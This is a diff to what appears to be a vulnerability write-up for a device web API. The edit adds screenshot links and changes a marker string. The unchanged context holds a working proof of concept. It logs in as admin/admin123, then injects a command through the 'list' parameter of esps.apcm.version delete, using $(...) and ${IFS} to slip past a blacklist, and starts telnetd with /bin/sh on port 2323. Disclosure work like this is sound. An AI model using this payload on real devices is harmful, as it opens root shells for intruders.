@@ -54,7 +54,7 @@ POST /api/esps
   -> /usr/lib/lua/magic_link/magic_link.lua maps object/method/param directly to ubus
   -> esps.apcm.version delete
 ```
-
+![alt text](imag/image.png)
 The blacklist is therefore the real boundary before root shell execution, and it is insufficient. It blocks:
 
 - backticks
@@ -139,7 +139,7 @@ Connection: close
 
 {"username":"admin","password":"admin123"}
 ```
-
+![alt text](imag/image-1.png)
 2. Extract `data.session` and send:
 
 ```http
@@ -151,9 +151,9 @@ Content-Type: application/json
 AUTHENTICATION: <SESSION>
 Connection: close
 
-[{"id":1,"object":"esps.apcm.version","method":"delete","param":{"list":["$(echo${IFS}APCMVER_RCE_OK>/tmp/apcmver_rce_marker&&/usr/sbin/telnetd${IFS}-p${IFS}2323${IFS}-l${IFS}/bin/sh)"]}}]
+[{"id":1,"object":"esps.apcm.version","method":"delete","param":{"list":["$(echo${IFS}APCMVER_RCE_OK_2323>/tmp/apcmver_rce_marker&&/usr/sbin/telnetd${IFS}-p${IFS}2323${IFS}-l${IFS}/bin/sh)"]}}]
 ```
-
+![alt text](imag/image-2.png)
 3. Wait briefly and connect:
 
 ```bash
@@ -173,7 +173,7 @@ id
 uname -a
 cat /tmp/apcmver_rce_marker
 ```
-
+![alt text](imag/image-3.png)
 5. Optional readback request:
 
 ```http
